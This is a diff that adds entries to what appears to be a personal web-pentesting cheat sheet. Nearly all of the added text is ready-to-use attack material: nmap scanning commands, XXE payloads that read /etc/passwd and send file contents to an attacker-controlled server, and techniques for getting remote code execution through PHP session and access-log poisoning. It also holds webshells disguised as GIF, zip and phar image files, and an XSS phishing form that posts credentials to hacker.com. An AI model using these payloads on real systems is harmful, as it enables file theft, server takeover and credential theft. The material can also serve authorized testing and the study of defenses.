@@ -145,6 +145,10 @@ nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv
 nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
 nmap -sV --script=vuln target
 nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target
+
+sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5		==> to get live ip 
+nmap google.com	-oA target 
+xsltproc  target.xml -o target.html	==> to create html report 
     
 --------------------------------------------------------------------------------------------------
 Directory Enumeration 
@@ -277,6 +281,56 @@ XXEINJECT
 
 
 
+local dtd 
+
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+
+XXE 
+try to convert json to xml and see if accepted if ok then try xxe
+to ensure that application parseing request as xml put  id=%26hossam;	==> as entity if returned error of entity then understands xml and inject it with xxe or xinclude 
+id=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+<!DOCTYPE hos [
+<!ENTITY ramy "this is test if reflected then vuln to xxe">]>
+can put another entity like 
+<!ENTITY ramy SYSTEM "file:///etc/passwd">
+<!ENTITY ramy SYSTEM "http://169.254.169.254">	==> if running on ec2
+<!ENTITY ramy SYSTEM "http://collaborator">	and put &ramy; in its place 		==> for blind xxe
+<!ENTITY % ramy SYSTEM "http://collaborator"> %ramy;							==> for non allowed entity 
+ 	
+
+
+or go to external server and put	file.dtd 
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://collaborator.com/?x=%file;'>">
+%eval;
+%exfil;
+------------------------
+and go back to repeater and put 
+<!DOCTYPE hos [
+<!ENTITY % ramy SYSTEM "http://The_server_you_uploaded_file/file.dtd">%ramy;
+]>
+
+if told you illegal character in url then use instead of http://collaborator => "file:///notfoundfile/%file;"  
+
+
+if found file upload you can retrive data with xxe as 
+upload file.svg with content ==> 	==> and after uploading it open the image find all content inside image
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [
+ <!ENTITY xxe SYSTEM "file:///etc/hostname" > 
+]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
 
 
 
@@ -479,6 +533,18 @@ after that use
 #curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 
 
+places of session files 
+ C:\Windows\Temp\
+ /var/lib/php/sessions/sess_	
+ to inject the session with url as 
+ 1- go to https://example.com?lang=hossamshady
+ 2- go to session file and see if hossamshady reflected there or not if yes then 	==> lang=/var/lib/php/sessions/sess_<session_token_here>	==> be attension of (sess_) token
+ 3- put ?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E			==> <?php system($_GET['cmd'])>  url encoded
+ 4- go back to access session file with &cmd=id
+ 
+ to inject access log file with User-Agent: <?php system($_GET['cmd'])>
+ and go to access log file with ?/language=/var/log/apache2/access.log&cmd=id
+ 
 
 
 ---------------------------------------------------------------------------------------------------
@@ -1199,9 +1265,38 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg
 	2- profile image extention's limited to jpg,png,jpeg
 	3- in upload image Request i changed file type test.jpg to test.php&test.php%00.jpg,... not bypassed
 	4- changed to test.svg and work
+
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif		==> To execute gif file 
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php		==> zip shell.php to shell.jpg
+language=zip://./profile_images/shell.jpg%23shell.php&cmd=id			==> execute
+
+shell.php
+		<?php
+		$phar = new Phar('shell.phar');
+		$phar->startBuffering();
+		$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+		$phar->setStub('<?php __HALT_COMPILER(); ?>');
+		$phar->stopBuffering();
+
+$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg		==> convert shell.php to shell.phar
+language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id				==> execute 
+
+
+
+
+
+
+
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------
 HTML INJECTION
 1- %27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo=		==> html , ssti , xss injection 	==>| httpx -mr "<h1>akira</h1>|60481729"
+
+<script>document.body.style.background = "#141d2b"</script>
+<script src="http://OUR_IP/script.js"></script>
+http://vulnuerable.com/phishing/index.php?url=document.write('<h3>Please login to continue</h3><form action=http://hacker.com/file.php><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+
+
+
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------
 headers injection with param miner 
